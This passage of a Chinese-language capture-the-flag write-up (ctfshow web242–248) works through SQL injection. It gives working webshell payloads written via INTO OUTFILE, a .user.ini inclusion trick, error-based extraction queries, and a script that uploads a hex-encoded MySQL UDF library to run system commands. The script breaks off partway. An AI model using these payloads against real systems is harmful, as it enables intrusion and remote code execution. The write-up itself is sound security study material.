src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409131541223.png" alt="image-20220409131541223"></p><pre><code>SELECT ... INTO OUTFILE &#39;file_name&#39;        [CHARACTER SET charset_name]        [export_options]export_options:    [&#123;FIELDS | COLUMNS&#125;        [TERMINATED BY &#39;string&#39;]//分隔符        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]        [ESCAPED BY &#39;char&#39;]    ]    [LINES        [STARTING BY &#39;string&#39;]        [TERMINATED BY &#39;string&#39;]    ]</code></pre><pre><code>“OPTION”参数为可选参数选项，其可能的取值有：`FIELDS TERMINATED BY &#39;字符串&#39;`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。`FIELDS ENCLOSED BY &#39;字符&#39;`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。`FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。`FIELDS ESCAPED BY &#39;字符&#39;`：设置转义字符，只能为单个字符。默认值为“\”。`LINES STARTING BY &#39;字符串&#39;`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。`LINES TERMINATED BY &#39;字符串&#39;`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</code></pre><ul><li>FIELDS TERMINATED BY</li><li>LINES STARTING BY</li><li>LINES TERMINATED BY</li></ul><pre><code>filename=1.php&#39; fields terminated by &#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;#</code></pre><p>接着访问dump&#x2F;1.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409131756459.png" alt="image-20220409131756459"></p><h1 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409131947051.png" alt="image-20220409131947051"></p><p>有index.php,上传.user.ini,不过要注意一下上传的格式</p><p>过滤了php，那么使用.user.ini进行文件包含，传入一个图片马，再使index.php包含图片马即可。具体操作如下：<br>先上传.user.ini(其中在每行开头加了;用于注释掉从表ctfshow_user中读出的内容)：</p><pre><code>filename=.user.ini&#39; LINES STARTING BY &#39;;&#39; TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653d7a662e6a70670a#</code></pre><p>.user.ini的结果类似于：</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409132736975.png" alt="image-20220409132736975"></p><p>再上传图片马</p><pre><code>filename=zf.jpg&#39; lines starting by &#39;&lt;?=eval($_POST[zf]);?&gt;&#39;#</code></pre><h1 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h1><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409132921712.png" alt="image-20220409132921712"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409132917871.png" alt="image-20220409132917871"></p><p>extractvalue()</p><pre><code>api/?id=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))-- #&amp;page=1&amp;limit=10</code></pre><p>updatexml()</p><pre><code>/api/?id=1&#39; or updatexml(1,concat(1,(database())),1) -- #&amp;page=1&amp;limit=10</code></pre><p>floor()</p><pre><code>/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</code></pre><p>ceil()</p><pre><code>/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</code></pre><p>round()</p><pre><code>/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,round(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</code></pre><p>都试一下咯</p><pre><code>模板/api/?id=1&#39; or updatexml(1,concat(1,([])),1) -- #&amp;page=1&amp;limit=10表名/api/?id=1&#39; or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) -- #&amp;page=1&amp;limit=10字段名/api/?id=1&#39; or updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flag&#39;)),1) -- #&amp;page=1&amp;limit=10数据 分开读/api/?id=1&#39; or updatexml(1,concat(1,(select left(flag,30) from ctfshow_flag)),1) -- #&amp;page=1&amp;limit=10        ctfshow&#123;35d09f15-bd71-4970-90c/api/?id=1&#39; or updatexml(1,concat(1,(select right(flag,27) from ctfshow_flag)),1) -- #&amp;page=1&amp;limit=10            d71-4970-90ca-56b17f14ccb0&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409135233790.png" alt="image-20220409135233790"></p><h1 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409135326914.png" alt="image-20220409135326914"></p><pre><code>api/?id=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))-- #&amp;page=1&amp;limit=10</code></pre><pre><code>模板api/?id=1&#39; and extractvalue(1,concat(0x7e,([]),0x7e))-- #&amp;page=1&amp;limit=10表名api/?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))-- #&amp;page=1&amp;limit=10字段名api/?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagsa&#39;),0x7e))-- #&amp;page=1&amp;limit=10数据 分开读api/?id=1&#39; and extractvalue(1,concat(0x7e,(select left(flag1,30) from ctfshow_flagsa),0x7e))-- #&amp;page=1&amp;limit=10            ctfshow&#123;1232f3e3-1688-483c-a48api/?id=1&#39; and extractvalue(1,concat(0x7e,(select right(flag1,30) from ctfshow_flagsa),0x7e))-- #&amp;page=1&amp;limit=10            3-1688-483c-a483-990657e35c81&#125;</code></pre><h1 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409135940440.png" alt="image-20220409135940440"></p><pre><code>/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</code></pre><pre><code>模板/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,([]),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10表名/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10字段名/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&#39;ctfshow_flags&#39; limit 1,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10数据/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select flag2 from ctfshow_flags),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</code></pre><h1 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409140732039.png" alt="image-20220409140732039"></p><pre><code>/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,round(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</code></pre><pre><code>模板/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,([]),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10表名/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10字段名/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&#39;ctfshow_flagsa&#39; limit 1,1),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10数据/api/?id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select `flag?` from ctfshow_flagsa),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</code></pre><p>可以看到这个字段名<code>flag?</code>加了反引号，原因是：表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字段.表名、字段名、数据库名等可用反引号 ( &#96; )，也可以不使用反引号 ，但如果它包含特殊字符或保留字，则必须使用，如果不使用就会报错</p><h1 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h1><h2 id="udf注入"><a href="#udf注入" class="headerlink" title="udf注入"></a>udf注入</h2><pre><code class="python">#参考脚本#环境：Linux/MariaDBimport requests url=&#39;http://89a7098e-03f5-47f3-9cb5-1f1cd3d640e9.challenge.ctf.show:8080/api/?id=&#39;code=&#39;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#39;codes=[]for i in range(0,len(code),128):    codes.append(code[i:min(i+128,len(code))]) #建临时表sql=&#39;&#39;&#39;create table temp(data longblob)&#39;&#39;&#39;payload=&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)requests.get(url+payload) #清空临时表sql=&#39;&#39;&#39;delete from temp&#39;&#39;&#39;payload=&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)requests.get(url+payload) #插入第一段数据sql=&#39;&#39;&#39;insert into temp(data) values (0x&#123;&#125;)&#39;&#39;&#39;.format(codes[0])payload=&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)requests.get(url+payload) #更新连接剩余数据for k in range(1,len(codes)):    sql=&#39;&#39;&#39;update temp set data = concat(data,0x&#123;&#125;)&#39;&#39;&#39;.format(codes[k])    payload=&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)    requests.get(url+payload) #10.3.18-MariaDB    #写入so文件sql=&#39;&#39;&#39;select data from temp into dumpfile &#39;/usr/lib/mariadb/plugin/udf.so\&#39;&#39;&#39;&#39;payload=&#39;&#39;&#39;0&#39;;&#123;&#125;;-- 